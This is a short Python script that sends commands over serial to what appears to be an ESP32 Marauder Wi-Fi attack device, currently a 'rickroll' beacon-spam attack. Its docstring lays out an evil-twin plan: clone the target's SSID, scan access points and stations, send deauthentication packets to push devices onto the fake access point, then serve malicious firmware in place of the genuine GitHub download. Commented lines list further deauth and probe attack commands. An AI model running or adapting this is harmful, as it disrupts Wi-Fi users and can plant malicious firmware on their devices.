import serial.tools.list_ports as ports
import serial

usbDevice = "/dev/tty.usbserial-0001"
BAUD_RATE = 115200
rickroll=b'attack -t rickroll'
applaAttack=b'sourapple'
stop=b'stopscan'
scanap="scansta" "scanap"
lst="list -a" 
#select -a 0
#attack -t deauth -c
'''
1. Start nat router with same wifi and ssid as the target, connect to it and start up malicous servers
2. `scanap` with the marauder to save a list of sccess points
3. `scansta` with the marauder to save a list of stations and their access points
4. list -c to find the router with ssid and maximum connection (That's our real router) 
5. `select -a <ap-number>` to select the device to fake death packets from so devices will switch to the fake access point
6. Great, now when a request to get the new firmware is made, it will use the one provided by our servers instead of github
'''

conn = serial.Serial(usbDevice, BAUD_RATE, timeout=1)
if conn.is_open:
        print(f"Connected to {usbDevice} at {BAUD_RATE} baud\n")
        print("sending cmd...")
        try:
            conn.write(rickroll)
        except KeyboardInterrupt:
            pass
        finally:
            conn.close()
            print("\nConnection closed...\n")
else:
    print(f"Failed to connect to {usbDevice}")
    exit()


# // scanap 
# // stopscan
# // scansta
# // stopscan
# // list -c 
# // list -a
# // list -s
# // select -a 4
# // attack -t deauth 
# // attack -t probe